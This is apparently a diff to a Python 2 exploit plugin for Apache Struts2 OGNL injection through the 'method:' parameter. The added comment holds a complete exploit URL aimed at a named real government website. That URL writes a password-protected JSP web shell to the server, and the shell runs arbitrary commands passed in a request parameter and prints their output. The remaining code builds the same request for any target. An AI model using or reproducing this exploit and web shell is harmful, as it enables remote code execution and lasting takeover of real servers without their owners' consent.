@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # encoding: utf-8
-from t  import T
+from ..t  import T
 import random,urllib2
 import httplib
 import traceback
@@ -53,6 +53,8 @@ class P(T):
               "er.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatch" \
               "er.HttpServletResponse&reqobj=%2f&reqobj={filename}&content={" \
               "content}".format(url=target_url, filename=jsp_file, content=content)
+
+	# 'http://www.dcqjw.gov.cn:80/sflogin_usercenter.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=#parameters.reqobj[0],#c=#parameters.reqobj[1],#req=#context.get(#a),#b=#req.getRealPath(#c)+#parameters.reqobj[2],#fos=new:java.io.FileOutputStream(#b),#fos.write(#parameters.content[0].getBytes()),#fos.close(),#hh=#context.get(#parameters.rpsobj[0]),#hh.getWriter().println(#b),#hh.getWriter().flush(),#hh.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&reqobj=32203.jsp&content=gif89a<%\n    if("024".equals(request.getParameter("pwd"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print("<pre>");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print("</pre>");\n    }\n%>'
 	user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
 	headers = { 'User-Agent' : user_agent }
         print target_url
